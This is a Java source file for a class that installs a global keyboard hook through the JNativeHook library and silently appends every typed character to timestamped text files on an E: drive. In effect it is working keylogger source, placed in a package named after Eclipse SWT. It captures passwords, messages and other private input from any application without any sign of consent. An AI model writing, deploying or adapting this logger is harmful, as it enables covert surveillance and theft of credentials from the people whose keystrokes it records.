package org.eclipse.wb.swt;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.text.SimpleDateFormat;
import java.util.Date;

import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyInputListener extends Thread implements NativeKeyListener
{
	static	String dateAsString1;
	public void run()
	{
		try {
        	GlobalScreen.registerNativeHook(); //func lib           

            /* Construct the example object and initialze native hook. */
            GlobalScreen.addNativeKeyListener(new KeyInputListener());
		}
		catch(Exception ex)
		{
			
		}
		}

	@Override
	public void nativeKeyPressed(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
		// TODO Auto-generated method stub
		try {
			
			SimpleDateFormat simpleDateFormat = new SimpleDateFormat("YYYY-MM-dd-hh-mm");
			dateAsString1=simpleDateFormat.format(new Date());
			 System.out.println("entering native key type");
   		
	          String keyString;
	          keyString =  e.getKeyText(e.getKeyCode());	 
	          if(e.getKeyCode()== e.VC_SPACE)
	          {
	          keyString=" ";
	          }
	          if (keyString.length() > 1 )
	        	  return;
	          else
	          {
	          
	          //For system print console
	         System.out.println(keyString);
	          //For output to file
	         
	          File a =new File("E:/screen/"+dateAsString1+".txt");
	          if (!a.exists()) {
	                a.createNewFile();
	            }
	          
	          
	          
	       // System.out.println("Entering value "+e.getKeyChar());
	          FileWriter fw = new FileWriter(a.getAbsoluteFile(),true);
	          BufferedWriter bw = new BufferedWriter(fw);
	          bw.append(keyString);
          
	          bw.close(); 
	          
	          System.out.println(a.exists()+" exists");
	          }
	        } catch (Exception e1) {        
	            e1.printStackTrace();
	           
	           
	        }
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub
		
	}
	
	public void Shutdown()
	{
		try
		{
		GlobalScreen.removeNativeKeyListener(null);
		GlobalScreen.unregisterNativeHook();
		}
		catch(Exception ex)
		{
			System.out.println(ex);
		}
	}
	

}	
		